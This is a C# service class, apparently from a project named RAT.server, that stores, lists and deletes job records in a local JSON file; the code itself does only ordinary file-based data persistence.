using System.Text.Json;
using RAT.server.Interfaces;
using RAT.server.Models;

namespace RAT.server.Services;

public class JsonService : IJsonService
{
	private readonly string filePath;
	private readonly string folderPath;
	private readonly JsonSerializerOptions options = new() { WriteIndented = true };

	public JsonService()
	{
		folderPath = Directory.GetCurrentDirectory() + "/Data/";
		filePath = Path.Combine(folderPath, "data.json");
	}

	public Result<Job> SaveNewJob(Job job)
	{
		var result = new Result<Job>();
		HandleDataPaths();

		try
		{
			var allJobs = GetAllJobs();
			var newId = allJobs.Count != 0 ? allJobs.Max(j => j.JobId) + 1 : 1;

			job.JobId = newId;
			allJobs.Add(job);

			var jsonString = JsonSerializer.Serialize(allJobs, options);
			File.WriteAllText(filePath, jsonString);

			result.Message = "Job successfully saved!";
			result.Data = job;
		}
		catch (Exception e)
		{
			result.Success = false;
			result.Message = $"JSON failed to save: {e.Message}";
		}

		return result;
	}

	public List<Job> GetAllJobs()
	{
		var jobs = new List<Job>();
		HandleDataPaths();

		try
		{
			var json = File.ReadAllText(filePath);
			jobs = JsonSerializer.Deserialize<List<Job>>(json) ?? [];
		}
		catch (Exception e)
		{
			Console.WriteLine(e);
		}

		return jobs;
	}

	public Result<Job> DeleteJob(int jobId)
	{
		var result = new Result<Job>();
		var allJobs = GetAllJobs();
		var job = allJobs.Find(j => j.JobId == jobId);
		if (job != null)
		{
			allJobs.Remove(job);
			var jsonString = JsonSerializer.Serialize(allJobs, options);
			File.WriteAllText(filePath, jsonString);

			result.Data = job;
			result.Message = "Success! Job removed.";
		}
		else
		{
			result.Message = "Error: job not found";
			result.Success = false;
		}

		return result;
	}

	private void HandleDataPaths()
	{
		if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);
		if (!File.Exists(filePath)) File.Create(filePath);
	}
}